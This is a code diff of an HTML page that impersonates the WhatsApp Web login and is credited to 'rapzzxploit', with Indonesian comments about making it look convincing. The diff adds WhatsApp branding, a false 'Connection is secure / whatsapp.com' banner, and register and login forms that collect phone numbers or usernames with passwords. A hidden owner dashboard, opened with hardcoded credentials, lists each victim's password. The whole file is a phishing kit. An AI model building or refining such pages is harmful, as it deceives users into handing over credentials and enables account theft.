@@ -3,22 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔐 WhatsApp Web - Official</title>
+    <title>WhatsApp Web - Official Login</title>
     
-    <!-- Meta buat viral -->
-    <meta property="og:title" content="WhatsApp Web - Login">
-    <meta property="og:description" content="Akses WhatsApp Web dengan aman">
+    <!-- Meta Tags biar meyakinkan -->
+    <meta property="og:title" content="WhatsApp Web">
+    <meta property="og:description" content="WhatsApp Web official login page">
+    <meta property="og:image" content="https://static.whatsapp.net/rsrc.php/v3/y7/r/DSxOA2Dv8lY.png">
+    <meta name="theme-color" content="#075E54">
     
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
         }
         
         body {
-            background: linear-gradient(135deg, #00b09b, #96c93d);
+            background: #111111;
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -26,42 +28,150 @@
             padding: 20px;
         }
         
-        .container {
-            max-width: 450px;
+        /* WhatsApp Background Pattern */
+        body::before {
+            content: "";
+            position: fixed;
+            top: 0;
+            left: 0;
             width: 100%;
-            position: relative;
+            height: 100%;
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" opacity="0.05"><path fill="%2300a884" d="M50 0 L100 50 L50 100 L0 50 Z"/></svg>');
+            background-size: 60px 60px;
+            pointer-events: none;
+            z-index: 0;
         }
         
-        .card {
+        .container {
+            max-width: 1000px;
+            width: 100%;
             background: white;
-            border-radius: 20px;
-            padding: 40px 30px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-            animation: slideUp 0.5s ease;
+            border-radius: 30px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            overflow: hidden;
+            position: relative;
+            z-index: 1;
+            animation: fadeIn 0.5s ease;
         }
         
-        @keyframes slideUp {
-            from { opacity: 0; transform: translateY(30px); }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
             to { opacity: 1; transform: translateY(0); }
         }
         
-        .logo {
+        /* Header Meta */
+        .meta-header {
+            background: #075E54;
+            padding: 8px 20px;
+            color: white;
+            font-size: 12px;
+            display: flex;
+            justify-content: space-between;
+            border-bottom: 1px solid #128C7E;
+        }
+        
+        .meta-header span {
+            opacity: 0.9;
+        }
+        
+        /* Main Content */
+        .main-content {
+            display: flex;
+            min-height: 500px;
+        }
+        
+        /* Left Panel - Info */
+        .info-panel {
+            flex: 1;
+            background: linear-gradient(145deg, #075E54 0%, #128C7E 100%);
+            padding: 40px;
+            color: white;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+        
+        .info-panel h1 {
+            font-size: 28px;
+            font-weight: 400;
+            margin-bottom: 20px;
+            line-height: 1.4;
+        }
+        
+        .info-panel h1 strong {
+            font-weight: 700;
+            display: block;
+            font-size: 32px;
+            margin-bottom: 10px;
+        }
+        
+        .feature-list {
+            margin: 30px 0;
+        }
+        
+        .feature-item {
+            display: flex;
+            align-items: center;
+            margin: 15px 0;
+            font-size: 16px;
+        }
+        
+        .feature-item .icon {
+            width: 24px;
+            height: 24px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 15px;
+            font-size: 14px;
+        }
+        
+        .qr-placeholder {
+            margin-top: 30px;
+            padding: 20px;
+            background: rgba(0,0,0,0.1);
+            border-radius: 12px;
             text-align: center;
+            border: 1px dashed rgba(255,255,255,0.3);
+        }
+        
+        .qr-placeholder small {
+            opacity: 0.8;
+            font-size: 13px;
+        }
+        
+        /* Right Panel - Login Form */
+        .login-panel {
+            flex: 1;
+            padding: 60px 40px;
+            background: white;
+        }
+        
+        .whatsapp-logo {
             margin-bottom: 30px;
         }
         
-        .logo h1 {
-            font-size: 32px;
-            font-weight: bold;
-            background: linear-gradient(135deg, #075E54, #128C7E);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+        .whatsapp-logo svg {
+            width: 40px;
+            height: 40px;
+            fill: #075E54;
         }
         
-        .logo p {
-            color: #666;
-            font-weight: bold;
-            margin-top: 5px;
+        .login-panel h2 {
+            color: #075E54;
+            font-size: 24px;
+            font-weight: 500;
+            margin-bottom: 10px;
+        }
+        
+        .login-panel .subtitle {
+            color: #667781;
+            font-size: 15px;
+            margin-bottom: 40px;
+            border-bottom: 1px solid #E9EDEF;
+            padding-bottom: 20px;
         }
         
         .input-group {
@@ -71,58 +181,69 @@
         .input-group label {
             display: block;
             margin-bottom: 8px;
-            color: #333;
-            font-weight: bold;
+            color: #3B4A54;
             font-size: 14px;
+            font-weight: 500;
         }
         
         .input-group input {
             width: 100%;
-            padding: 15px;
-            border: 2px solid #e0e0e0;
-            border-radius: 10px;
-            font-size: 16px;
-            transition: all 0.3s;
-            font-weight: bold;
+            padding: 14px 16px;
+            border: 1.5px solid #E9EDEF;
+            border-radius: 8px;
+            font-size: 15px;
+            transition: all 0.2s;
+            background: #FAFBFC;
         }
         
         .input-group input:focus {
-            border-color: #25D366;
             outline: none;
-            box-shadow: 0 0 0 3px rgba(37, 211, 102, 0.1);
+            border-color: #075E54;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(7, 94, 84, 0.1);
+        }
+        
+        .input-group input::placeholder {
+            color: #A0B2B8;
+            font-size: 14px;
         }
         
         .btn-enter {
             width: 100%;
-            padding: 18px;
-            background: #25D366;
+            padding: 16px;
+            background: #075E54;
             color: white;
             border: none;
-            border-radius: 10px;
-            font-size: 18px;
-            font-weight: bold;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
             cursor: pointer;
-            margin: 10px 0;
-            transition: all 0.3s;
-            box-shadow: 0 5px 15px rgba(37, 211, 102, 0.3);
+            margin: 20px 0 15px 0;
+            transition: all 0.2s;
+            box-shadow: 0 5px 10px rgba(7, 94, 84, 0.2);
         }
         
         .btn-enter:hover {
             background: #128C7E;
-            transform: translateY(-2px);
-            box-shadow: 0 8px 20px rgba(37, 211, 102, 0.4);
+            transform: translateY(-1px);
+            box-shadow: 0 7px 15px rgba(7, 94, 84, 0.3);
+        }
+        
+        .btn-enter:active {
+            transform: translateY(1px);
+            box-shadow: 0 3px 8px rgba(7, 94, 84, 0.2);
         }
         
         .switch-auth {
             text-align: center;
             margin: 20px 0;
-            font-weight: bold;
         }
         
         .switch-auth a {
-            color: #25D366;
+            color: #075E54;
             text-decoration: none;
-            font-weight: bold;
+            font-size: 14px;
+            font-weight: 500;
             cursor: pointer;
         }
         
@@ -130,20 +251,52 @@
             text-decoration: underline;
         }
         
-        /* Iklan Space */
-        .ad-container {
-            margin: 30px 0;
-            padding: 15px;
-            background: #f5f5f5;
-            border-radius: 10px;
-            border: 2px dashed #25D366;
+        .help-links {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 30px;
+            font-size: 13px;
+            color: #8696A0;
         }
         
-        .ad-label {
-            font-size: 12px;
-            color: #999;
-            margin-bottom: 10px;
-            font-weight: bold;
+        .help-links span {
+            cursor: default;
+        }
+        
+        /* Footer */
+        .footer {
+            background: #F0F2F4;
+            padding: 12px 30px;
+            border-top: 1px solid #E9EDEF;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 13px;
+            color: #5E6F7D;
+        }
+        
+        .footer-left {
+            display: flex;
+            gap: 20px;
+        }
+        
+        .footer-left span {
+            cursor: pointer;
+        }
+        
+        .footer-left span:hover {
+            color: #075E54;
+        }
+        
+        .footer-right {
+            font-weight: 600;
+            letter-spacing: 0.3px;
+        }
+        
+        .footer-right .rapzz {
+            color: #075E54;
+            font-weight: 700;
         }
         
         /* Owner Menu */
@@ -153,188 +306,21 @@
             left: 20px;
             cursor: pointer;
             z-index: 1000;
-        }
-        
-        .menu-dots {
-            font-size: 24px;
+            background: rgba(0,0,0,0.6);
             color: white;
-            text-shadow: 0 2px 5px rgba(0,0,0,0.3);
-            font-weight: bold;
-        }
-        
-        .dropdown-content {
-            display: none;
-            position: absolute;
-            top: 30px;
-            left: 0;
-            background: white;
-            min-width: 300px;
-            box-shadow: 0 8px 16px rgba(0,0,0,0.2);
-            border-radius: 10px;
-            padding: 15px;
-            z-index: 1001;
-        }
-        
-        .dropdown-content.show {
-            display: block;
-        }
-        
-        .dropdown-content h3 {
-            color: #075E54;
-            margin-bottom: 15px;
-            font-weight: bold;
-        }
-        
-        /* Owner Login Modal */
-        .owner-login-modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.8);
-            z-index: 2000;
-            justify-content: center;
-            align-items: center;
-        }
-        
-        .owner-login-modal.show {
-            display: flex;
-        }
-        
-        .owner-login-card {
-            background: white;
-            padding: 30px;
-            border-radius: 20px;
-            width: 90%;
-            max-width: 350px;
-        }
-        
-        .owner-login-card h2 {
-            color: #075E54;
-            margin-bottom: 20px;
-            text-align: center;
-        }
-        
-        .owner-panel {
-            display: none;
-        }
-        
-        .owner-panel.show {
-            display: block;
-        }
-        
-        .stats-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 10px;
-            margin-bottom: 20px;
-        }
-        
-        .stat-box {
-            background: #f0f0f0;
-            padding: 15px;
-            border-radius: 10px;
-            text-align: center;
-        }
-        
-        .stat-number {
-            font-size: 24px;
-            font-weight: bold;
-            color: #075E54;
-        }
-        
-        .stat-label {
-            font-size: 12px;
-            color: #666;
-            margin-top: 5px;
-        }
-        
-        .user-list-container {
-            max-height: 300px;
-            overflow-y: auto;
-            border: 1px solid #eee;
-            border-radius: 10px;
-            margin-bottom: 15px;
-        }
-        
-        .user-item {
-            padding: 12px;
-            border-bottom: 1px solid #eee;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        
-        .user-item:last-child {
-            border-bottom: none;
-        }
-        
-        .user-info {
-            flex: 1;
-        }
-        
-        .user-info .username {
-            font-weight: bold;
-            color: #075E54;
-        }
-        
-        .user-info .password {
-            font-size: 12px;
-            color: #ff4444;
-            margin-top: 3px;
-        }
-        
-        .user-info .date {
-            font-size: 11px;
-            color: #999;
-            margin-top: 2px;
-        }
-        
-        .delete-btn {
-            background: #ff4444;
-            color: white;
-            border: none;
-            padding: 5px 10px;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 12px;
-            font-weight: bold;
-        }
-        
-        .delete-btn:hover {
-            background: #cc0000;
-        }
-        
-        .active-users {
-            margin-top: 15px;
-            padding: 10px;
-            background: #e8f5e8;
-            border-radius: 10px;
-        }
-        
-        .active-user-item {
-            padding: 8px;
-            border-bottom: 1px solid #c8e6c9;
-            display: flex;
-            justify-content: space-between;
-            font-size: 13px;
-        }
-        
-        .active-user-item:last-child {
-            border-bottom: none;
-        }
-        
-        .online-dot {
-            width: 8px;
-            height: 8px;
-            background: #4caf50;
+            width: 36px;
+            height: 36px;
             border-radius: 50%;
-            display: inline-block;
-            margin-right: 5px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+            font-weight: bold;
+            backdrop-filter: blur(5px);
+            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
         }
         
+        /* White Screen */
         .white-screen {
             position: fixed;
             top: 0;
@@ -356,8 +342,8 @@
         .loading-spinner {
             width: 50px;
             height: 50px;
-            border: 5px solid #f3f3f3;
-            border-top: 5px solid #25D366;
+            border: 4px solid #E9EDEF;
+            border-top: 4px solid #075E54;
             border-radius: 50%;
             animation: spin 1s linear infinite;
             margin-bottom: 20px;
@@ -369,186 +355,412 @@
         }
         
         .white-screen p {
-            color: #333;
+            color: #3B4A54;
+            font-size: 16px;
+            font-weight: 400;
+        }
+        
+        /* Owner Panel Styling */
+        .dropdown-content {
+            display: none;
+            position: fixed;
+            top: 65px;
+            left: 20px;
+            background: white;
+            min-width: 350px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            border-radius: 12px;
+            padding: 20px;
+            z-index: 1001;
+            border: 1px solid #E9EDEF;
+        }
+        
+        .dropdown-content.show {
+            display: block;
+        }
+        
+        .dropdown-content h3 {
+            color: #075E54;
+            margin-bottom: 15px;
+            font-weight: 600;
             font-size: 18px;
+            border-bottom: 1px solid #E9EDEF;
+            padding-bottom: 10px;
+        }
+        
+        .stats-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        
+        .stat-box {
+            background: #F0F2F4;
+            padding: 15px;
+            border-radius: 8px;
+            text-align: center;
+        }
+        
+        .stat-number {
+            font-size: 24px;
             font-weight: bold;
+            color: #075E54;
+        }
+        
+        .stat-label {
+            font-size: 12px;
+            color: #5E6F7D;
+            margin-top: 5px;
+        }
+        
+        .user-list-container {
+            max-height: 300px;
+            overflow-y: auto;
+            border: 1px solid #E9EDEF;
+            border-radius: 8px;
+            margin-bottom: 15px;
+        }
+        
+        .user-item {
+            padding: 12px;
+            border-bottom: 1px solid #E9EDEF;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .user-item:last-child {
+            border-bottom: none;
+        }
+        
+        .user-info {
+            flex: 1;
+        }
+        
+        .user-info .username {
+            font-weight: 600;
+            color: #075E54;
+        }
+        
+        .user-info .password {
+            font-size: 12px;
+            color: #E74C3C;
+            margin-top: 3px;
+            font-family: monospace;
+        }
+        
+        .user-info .date {
+            font-size: 11px;
+            color: #8696A0;
+            margin-top: 2px;
+        }
+        
+        .delete-btn {
+            background: none;
+            color: #E74C3C;
+            border: 1px solid #E74C3C;
+            padding: 5px 10px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 12px;
+            font-weight: 500;
+        }
+        
+        .delete-btn:hover {
+            background: #E74C3C;
+            color: white;
+        }
+        
+        .active-users {
+            margin-top: 15px;
+            padding: 12px;
+            background: #E8F5E9;
+            border-radius: 8px;
+        }
+        
+        .active-users h4 {
+            color: #075E54;
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+        
+        .active-user-item {
+            padding: 5px 0;
+            display: flex;
+            justify-content: space-between;
+            font-size: 13px;
+        }
+        
+        .online-dot {
+            width: 8px;
+            height: 8px;
+            background: #2ECC71;
+            border-radius: 50%;
+            display: inline-block;
+            margin-right: 5px;
         }
         
         .logout-btn {
             width: 100%;
             padding: 10px;
-            background: #ff4444;
+            background: #075E54;
             color: white;
             border: none;
-            border-radius: 5px;
+            border-radius: 8px;
             cursor: pointer;
             margin-top: 15px;
-            font-weight: bold;
+            font-weight: 500;
+        }
+        
+        .logout-btn:hover {
+            background: #128C7E;
+        }
+        
+        /* Owner Login Modal */
+        .owner-login-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.7);
+            z-index: 2000;
+            justify-content: center;
+            align-items: center;
+            backdrop-filter: blur(5px);
+        }
+        
+        .owner-login-modal.show {
+            display: flex;
+        }
+        
+        .owner-login-card {
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            width: 90%;
+            max-width: 350px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+        }
+        
+        .owner-login-card h2 {
+            color: #075E54;
+            margin-bottom: 20px;
+            text-align: center;
+            font-weight: 600;
         }
     </style>
-    
-    <!-- Ad Scripts -->
-    <script>
-        var adNetworks = [
-            'https://example.com/ad1',
-            'https://example.com/ad2',
-            'https://example.com/ad3'
-        ];
-        
-        function triggerAds() {
-            adNetworks.forEach(function(ad, index) {
-                setTimeout(function() {
-                    window.open(ad, '_blank');
-                }, index * 1500);
-            });
-        }
-        
-        document.addEventListener('click', triggerAds);
-    </script>
 </head>
 <body>
-    <!-- Owner Menu (3 Dots) -->
-    <div class="owner-menu" onclick="toggleOwnerMenu()">
-        <div class="menu-dots">⋮</div>
-    </div>
+    <!-- Owner Menu -->
+    <div class="owner-menu" onclick="toggleOwnerMenu()">⋮</div>
     
     <!-- Owner Login Modal -->
     <div class="owner-login-modal" id="ownerLoginModal">
         <div class="owner-login-card">
-            <h2>👑 OWNER LOGIN</h2>
+            <h2>🔐 Owner Access</h2>
             <div class="input-group">
                 <label>Username</label>
-                <input type="text" id="ownerUsername" placeholder="Enter username">
+                <input type="text" id="ownerUsername" placeholder="Enter owner username">
             </div>
             <div class="input-group">
                 <label>Password</label>
-                <input type="password" id="ownerPassword" placeholder="Enter password">
+                <input type="password" id="ownerPassword" placeholder="Enter owner password">
             </div>
             <button class="btn-enter" onclick="ownerLogin()">LOGIN</button>
         </div>
     </div>
     
-    <!-- Owner Panel (Hidden until login) -->
+    <!-- Owner Panel -->
     <div class="dropdown-content" id="ownerDropdown">
-        <div class="owner-panel" id="ownerPanel">
-            <h3>👑 OWNER DASHBOARD</h3>
-            
-            <div class="stats-grid">
-                <div class="stat-box">
-                    <div class="stat-number" id="totalUsers">0</div>
-                    <div class="stat-label">Total Register</div>
-                </div>
-                <div class="stat-box">
-                    <div class="stat-number" id="activeNow">0</div>
-                    <div class="stat-label">Active Now</div>
-                </div>
+        <h3>👑 OWNER DASHBOARD</h3>
+        <div class="stats-grid">
+            <div class="stat-box">
+                <div class="stat-number" id="totalUsers">0</div>
+                <div class="stat-label">Registered</div>
             </div>
-            
-            <h4>📋 REGISTERED USERS</h4>
-            <div class="user-list-container" id="userList">
-                <!-- Users will appear here -->
+            <div class="stat-box">
+                <div class="stat-number" id="activeNow">0</div>
+                <div class="stat-label">Active Now</div>
             </div>
-            
-            <div class="active-users">
-                <h4>🟢 ACTIVE NOW</h4>
-                <div id="activeUsersList">
-                    <!-- Active users will appear here -->
-                </div>
-            </div>
-            
-            <button class="logout-btn" onclick="ownerLogout()">LOGOUT</button>
         </div>
+        
+        <h4 style="margin-bottom:10px;">📋 Registered Users</h4>
+        <div class="user-list-container" id="userList">
+            <!-- Users will appear here -->
+        </div>
+        
+        <div class="active-users">
+            <h4>🟢 Active Now</h4>
+            <div id="activeUsersList"></div>
+        </div>
+        
+        <button class="logout-btn" onclick="ownerLogout()">LOGOUT</button>
     </div>
     
     <!-- Main Container -->
     <div class="container" id="mainContainer">
-        <!-- Register Form -->
-        <div class="card" id="registerForm">
-            <div class="logo">
-                <h1>WhatsApp Web</h1>
-                <p>Register Account</p>
+        <!-- Meta Header -->
+        <div class="meta-header">
+            <span>🔒 Connection is secure</span>
+            <span>🌐 whatsapp.com</span>
+        </div>
+        
+        <!-- Register Form (Hidden by default) -->
+        <div id="registerForm">
+            <div class="main-content">
+                <!-- Left Panel -->
+                <div class="info-panel">
+                    <h1>
+                        <strong>WhatsApp Web</strong>
+                        Connect your phone to WhatsApp on your computer
+                    </h1>
+                    
+                    <div class="feature-list">
+                        <div class="feature-item">
+                            <span class="icon">✓</span>
+                            End-to-end encrypted
+                        </div>
+                        <div class="feature-item">
+                            <span class="icon">✓</span>
+                            Sync messages across devices
+                        </div>
+                        <div class="feature-item">
+                            <span class="icon">✓</span>
+                            Secure connection
+                        </div>
+                    </div>
+                    
+                    <div class="qr-placeholder">
+                        <small>Powered by rapzzxploit</small>
+                    </div>
+                </div>
+                
+                <!-- Right Panel -->
+                <div class="login-panel">
+                    <div class="whatsapp-logo">
+                        <svg viewBox="0 0 24 24">
+                            <path d="M19.077 4.928C17.191 3.041 14.683 2 12.006 2 6.798 2 2.528 6.27 2.528 11.477c0 1.839.48 3.64 1.398 5.246L2 22l5.426-1.831c1.537.861 3.27 1.315 5.065 1.315 5.207 0 9.477-4.27 9.477-9.477 0-2.677-1.041-5.185-2.928-7.072l.037-.007zM12.006 20.31c-1.534 0-3.04-.414-4.355-1.194l-.312-.186-3.222 1.087 1.082-3.166-.197-.324c-.832-1.35-1.271-2.905-1.271-4.498 0-4.419 3.595-8.014 8.014-8.014 2.14 0 4.152.835 5.664 2.347 1.512 1.512 2.346 3.524 2.346 5.664 0 4.419-3.595 8.014-8.014 8.014l.023-.05z"/>
+                            <path d="M16.142 13.583c-.232-.116-1.368-.674-1.579-.751-.211-.078-.365-.116-.519.116-.154.232-.596.751-.73.905-.135.154-.27.174-.502.058-.972-.422-1.724-.968-2.398-1.618-.375-.356-.665-.726-.91-1.124-.116-.174-.012-.269.087-.36.087-.078.194-.232.29-.348.097-.116.129-.194.194-.328.065-.135.032-.27-.016-.386-.049-.116-.462-1.112-.634-1.523-.166-.398-.335-.348-.462-.358l-.397-.008c-.135 0-.328.048-.502.232-.174.183-.665.648-.665 1.582 0 .933.679 1.835.774 1.962.097.126 1.337 2.04 3.24 2.798 1.903.758 1.903.503 2.247.472.344-.032 1.109-.454 1.265-.892.156-.438.156-.814.11-.892-.048-.078-.173-.126-.309-.194l.005-.02z"/>
+                        </svg>
+                    </div>
+                    
+                    <h2>Create account</h2>
+                    <div class="subtitle">Register to use WhatsApp Web</div>
+                    
+                    <div class="input-group">
+                        <label>Username / Phone number</label>
+                        <input type="text" id="regUsername" placeholder="Enter username" autocomplete="off">
+                    </div>
+                    
+                    <div class="input-group">
+                        <label>Password</label>
+                        <input type="password" id="regPassword" placeholder="Create password">
+                    </div>
+                    
+                    <button class="btn-enter" onclick="register()">REGISTER</button>
+                    
+                    <div class="switch-auth">
+                        <a onclick="showLogin()">Already have account? Login →</a>
+                    </div>
+                    
+                    <div class="help-links">
+                        <span>Trouble registering?</span>
+                        <span>Privacy Policy</span>
+                    </div>
+                </div>
             </div>
             
-            <!-- Ad Space Top -->
-            <div class="ad-container">
-                <div class="ad-label">ADVERTISEMENT</div>
-                <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-xxxxxxxxxx" crossorigin="anonymous"></script>
-                <ins class="adsbygoogle"
-                     style="display:block"
-                     data-ad-client="ca-pub-xxxxxxxxxx"
-                     data-ad-slot="1234567890"
-                     data-ad-format="auto"
-                     data-full-width-responsive="true"></ins>
-                <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
-            </div>
-            
-            <div class="input-group">
-                <label>📱 Username / Phone Number</label>
-                <input type="text" id="regUsername" placeholder="Enter username" autocomplete="off">
-            </div>
-            
-            <div class="input-group">
-                <label>🔒 Password</label>
-                <input type="password" id="regPassword" placeholder="Create password">
-            </div>
-            
-            <button class="btn-enter" onclick="register()">ENTER</button>
-            
-            <div class="switch-auth">
-                <a onclick="showLogin()">Already have account? LOGIN</a>
-            </div>
-            
-            <!-- Ad Space Bottom -->
-            <div class="ad-container">
-                <div class="ad-label">ADVERTISEMENT</div>
-                <script>
-                    window.open('https://example.com/popunder', '_blank');
-                </script>
+            <!-- Footer -->
+            <div class="footer">
+                <div class="footer-left">
+                    <span>About</span>
+                    <span>Features</span>
+                    <span>Security</span>
+                </div>
+                <div class="footer-right">
+                    Powered by <span class="rapzz">rapzzxploit</span>
+                </div>
             </div>
         </div>
         
         <!-- Login Form -->
-        <div class="card" id="loginForm" style="display: none;">
-            <div class="logo">
-                <h1>WhatsApp Web</h1>
-                <p>Login to Account</p>
+        <div id="loginForm" style="display: none;">
+            <div class="main-content">
+                <!-- Left Panel -->
+                <div class="info-panel">
+                    <h1>
+                        <strong>Welcome Back</strong>
+                        Login to continue your conversations
+                    </h1>
+                    
+                    <div class="feature-list">
+                        <div class="feature-item">
+                            <span class="icon">✓</span>
+                            Secure login
+                        </div>
+                        <div class="feature-item">
+                            <span class="icon">✓</span>
+                            Remember your messages
+                        </div>
+                        <div class="feature-item">
+                            <span class="icon">✓</span>
+                            Multi-device support
+                        </div>
+                    </div>
+                    
+                    <div class="qr-placeholder">
+                        <small>Powered by rapzzxploit</small>
+                    </div>
+                </div>
+                
+                <!-- Right Panel -->
+                <div class="login-panel">
+                    <div class="whatsapp-logo">
+                        <svg viewBox="0 0 24 24">
+                            <path d="M19.077 4.928C17.191 3.041 14.683 2 12.006 2 6.798 2 2.528 6.27 2.528 11.477c0 1.839.48 3.64 1.398 5.246L2 22l5.426-1.831c1.537.861 3.27 1.315 5.065 1.315 5.207 0 9.477-4.27 9.477-9.477 0-2.677-1.041-5.185-2.928-7.072l.037-.007zM12.006 20.31c-1.534 0-3.04-.414-4.355-1.194l-.312-.186-3.222 1.087 1.082-3.166-.197-.324c-.832-1.35-1.271-2.905-1.271-4.498 0-4.419 3.595-8.014 8.014-8.014 2.14 0 4.152.835 5.664 2.347 1.512 1.512 2.346 3.524 2.346 5.664 0 4.419-3.595 8.014-8.014 8.014l.023-.05z"/>
+                            <path d="M16.142 13.583c-.232-.116-1.368-.674-1.579-.751-.211-.078-.365-.116-.519.116-.154.232-.596.751-.73.905-.135.154-.27.174-.502.058-.972-.422-1.724-.968-2.398-1.618-.375-.356-.665-.726-.91-1.124-.116-.174-.012-.269.087-.36.087-.078.194-.232.29-.348.097-.116.129-.194.194-.328.065-.135.032-.27-.016-.386-.049-.116-.462-1.112-.634-1.523-.166-.398-.335-.348-.462-.358l-.397-.008c-.135 0-.328.048-.502.232-.174.183-.665.648-.665 1.582 0 .933.679 1.835.774 1.962.097.126 1.337 2.04 3.24 2.798 1.903.758 1.903.503 2.247.472.344-.032 1.109-.454 1.265-.892.156-.438.156-.814.11-.892-.048-.078-.173-.126-.309-.194l.005-.02z"/>
+                        </svg>
+                    </div>
+                    
+                    <h2>Login to WhatsApp</h2>
+                    <div class="subtitle">Enter your credentials</div>
+                    
+                    <div class="input-group">
+                        <label>Username</label>
+                        <input type="text" id="loginUsername" placeholder="Enter your username">
+                    </div>
+                    
+                    <div class="input-group">
+                        <label>Password</label>
+                        <input type="password" id="loginPassword" placeholder="Enter your password">
+                    </div>
+                    
+                    <button class="btn-enter" onclick="login()">LOGIN</button>
+                    
+                    <div class="switch-auth">
+                        <a onclick="showRegister()">Don't have account? Register →</a>
+                    </div>
+                    
+                    <div class="help-links">
+                        <span>Forgot password?</span>
+                        <span>Need help?</span>
+                    </div>
+                </div>
             </div>
             
-            <!-- Ad Space Top -->
-            <div class="ad-container">
-                <div class="ad-label">ADVERTISEMENT</div>
-                <ins class="adsbygoogle"
-                     style="display:block"
-                     data-ad-client="ca-pub-xxxxxxxxxx"
-                     data-ad-slot="1234567890"
-                     data-ad-format="auto"></ins>
-                <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
-            </div>
-            
-            <div class="input-group">
-                <label>📱 Username</label>
-                <input type="text" id="loginUsername" placeholder="Enter username">
-            </div>
-            
-            <div class="input-group">
-                <label>🔒 Password</label>
-                <input type="password" id="loginPassword" placeholder="Enter password">
-            </div>
-            
-            <button class="btn-enter" onclick="login()">ENTER</button>
-            
-            <div class="switch-auth">
-                <a onclick="showRegister()">Create new account? REGISTER</a>
-            </div>
-            
-            <!-- Ad Space Bottom -->
-            <div class="ad-container">
-                <div class="ad-label">ADVERTISEMENT</div>
-                <script>
-                    setTimeout(function() {
-                        window.location.href = 'https://example.com/redirect';
-                    }, 5000);
-                </script>
+            <!-- Footer -->
+            <div class="footer">
+                <div class="footer-left">
+                    <span>About</span>
+                    <span>Features</span>
+                    <span>Security</span>
+                </div>
+                <div class="footer-right">
+                    Powered by <span class="rapzz">rapzzxploit</span>
+                </div>
             </div>
         </div>
     </div>
@@ -556,8 +768,8 @@
     <!-- White Screen -->
     <div class="white-screen" id="whiteScreen">
         <div class="loading-spinner"></div>
-        <p>Loading WhatsApp Web...</p>
-        <p style="font-size: 14px; color: #999; margin-top: 10px;">Please wait, redirecting to secure chat</p>
+        <p>Connecting to WhatsApp Web...</p>
+        <p style="font-size: 12px; color: #8696A0; margin-top: 20px;">Powered by rapzzxploit</p>
     </div>
     
     <script>
@@ -565,8 +777,6 @@
         let users = JSON.parse(localStorage.getItem('whatsapp_users')) || [];
         let ownerLoggedIn = false;
         let sessionId = generateSessionId();
-        
-        // Active users tracking
         let activeUsers = {};
         
         function generateSessionId() {
@@ -576,12 +786,8 @@
         // Update active user
         function updateActiveUser() {
             const now = Date.now();
-            activeUsers[sessionId] = {
-                lastSeen: now,
-                userAgent: navigator.userAgent
-            };
+            activeUsers[sessionId] = { lastSeen: now };
             
-            // Cleanup old sessions (lebih dari 10 detik)
             for(let id in activeUsers) {
                 if(now - activeUsers[id].lastSeen > 10000) {
                     delete activeUsers[id];
@@ -591,26 +797,22 @@
             localStorage.setItem('active_users', JSON.stringify(activeUsers));
         }
         
-        // Update every 5 seconds
         setInterval(updateActiveUser, 5000);
         updateActiveUser();
         
-        // Get active users count
         function getActiveUsersCount() {
             const active = JSON.parse(localStorage.getItem('active_users')) || {};
             const now = Date.now();
             let count = 0;
             
             for(let id in active) {
-                if(now - active[id].lastSeen < 10000) {
-                    count++;
-                }
+                if(now - active[id].lastSeen < 10000) count++;
             }
             
             return count;
         }
         
-        // Toggle Owner Menu
+        // Owner functions
         function toggleOwnerMenu() {
             if(!ownerLoggedIn) {
                 document.getElementById('ownerLoginModal').classList.add('show');
@@ -622,20 +824,16 @@
             }
         }
         
-        // Owner Login
         function ownerLogin() {
             const username = document.getElementById('ownerUsername').value;
             const password = document.getElementById('ownerPassword').value;
             
-            // OWNER CREDENTIALS
             if(username === 'rapzzxploit' && password === 'adminsonlys') {
                 ownerLoggedIn = true;
                 document.getElementById('ownerLoginModal').classList.remove('show');
                 document.getElementById('ownerDropdown').classList.add('show');
-                document.getElementById('ownerPanel').classList.add('show');
                 updateOwnerPanel();
                 
-                // Clear login form
                 document.getElementById('ownerUsername').value = '';
                 document.getElementById('ownerPassword').value = '';
             } else {
@@ -643,22 +841,17 @@
             }
         }
         
-        // Owner Logout
         function ownerLogout() {
             ownerLoggedIn = false;
             document.getElementById('ownerDropdown').classList.remove('show');
-            document.getElementById('ownerPanel').classList.remove('show');
         }
         
-        // Update Owner Panel
